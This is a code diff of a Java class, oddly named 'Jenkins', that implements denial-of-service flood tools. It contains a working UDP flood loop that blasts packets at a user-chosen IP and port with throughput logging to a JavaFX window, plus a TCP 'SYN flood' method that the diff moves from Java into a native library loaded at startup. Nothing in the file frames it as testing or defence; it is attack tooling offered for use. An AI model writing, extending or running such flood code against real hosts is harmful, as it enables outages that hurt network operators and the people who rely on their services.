@@ -10,73 +10,75 @@ import javafx.scene.control.TextArea;
 import javafx.application.Platform;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.Random;
+import java.io.File;
 
 public class Jenkins {
     private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
     private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
     private volatile boolean stopAttack = false;
+    private TextArea logArea;
 
     // Constructor
     public Jenkins() {
         // Initialize any required resources
     }
 
+    // Method to set the log area
+    public void setLogArea(TextArea logArea) {
+        this.logArea = logArea;
+    }
+
     // UDP Flood method
     public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
-        logger.info("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");
+        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");
 
         try (DatagramSocket socket = new DatagramSocket()) {
             InetAddress targetAddress = InetAddress.getByName(targetIp);
-            DatagramPacket packet = new DatagramPacket(DEFAULT_PAYLOAD, DEFAULT_PAYLOAD.length, targetAddress, targetPort);
-            int bytesSent = 0;
+            byte[] buffer = new byte[1300]; // Adjust packet size if needed
+            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);
+
             long startTime = System.currentTimeMillis();
+            long bytesSent = 0;
+            int packetsSent = 0;
 
             while (!stopAttack) {
-                long currentTime = System.currentTimeMillis();
-                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
-                    socket.send(packet);
-                    bytesSent += DEFAULT_PAYLOAD.length;
-                } else {
-                    Thread.sleep(1); // Sleep for a short time to control the flow
+                socket.send(packet);
+                bytesSent += buffer.length;
+                packetsSent++;
+
+                if (packetsSent % 1000 == 0) { // Log every 1000 packets
+                    long elapsedTime = System.currentTimeMillis() - startTime;
+                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
+                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
+                }
+
+                // Add rate limiting if necessary
+                if (bytesSent >= bytesPerSecond) {
+                    long elapsedTime = System.currentTimeMillis() - startTime;
+                    if (elapsedTime < 1000) {
+                        Thread.sleep(1000 - elapsedTime);
+                    }
+                    startTime = System.currentTimeMillis();
+                    bytesSent = 0;
                 }
             }
         } catch (Exception e) {
-            logger.severe("Error during UDP flood: " + e.getMessage());
-        } finally {
-            logger.info("UDP flood attack stopped on " + targetIp + ":" + targetPort);
-            stopAttack = false; // Reset for future use
+            log("Error in UDP flood: " + e.getMessage());
         }
+        log("UDP flood attack stopped");
     }
 
     // TCP SYN Flood method
-    public void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond) {
-        logger.info("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");
+    public native void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);
 
+    static {
         try {
-            long startTime = System.currentTimeMillis();
-            int bytesSent = 0;
-
-            while (!stopAttack) {
-                long currentTime = System.currentTimeMillis();
-                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
-                    try {
-                        Socket socket = new Socket(targetIp, targetPort);
-                        OutputStream out = socket.getOutputStream();
-                        out.write(DEFAULT_PAYLOAD);
-                        socket.close();
-                        bytesSent += DEFAULT_PAYLOAD.length;
-                    } catch (Exception e) {
-                        // Ignore connection errors
-                    }
-                } else {
-                    Thread.sleep(1);
-                }
-            }
-        } catch (Exception e) {
-            logger.severe("Error during TCP SYN flood: " + e.getMessage());
-        } finally {
-            logger.info("TCP SYN flood attack stopped on " + targetIp + ":" + targetPort);
-            stopAttack = false;
+            System.loadLibrary("tcpsynflood");
+        } catch (UnsatisfiedLinkError e) {
+            System.err.println("Native code library failed to load. \n" + e);
+            System.err.println("java.library.path: " + System.getProperty("java.library.path"));
+            System.exit(1);
         }
     }
 
@@ -109,5 +111,20 @@ public class Jenkins {
     // Method to stop the attack
     public void stopAttack() {
         stopAttack = true;
+    }
+
+    // Method to reset the attack
+    public void resetAttack() {
+        stopAttack = false;
+    }
+
+    // Method to log a message
+    private void log(String message) {
+        logger.info(message);
+        if (logArea != null) {
+            Platform.runLater(() -> {
+                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
+            });
+        }
     }
 }
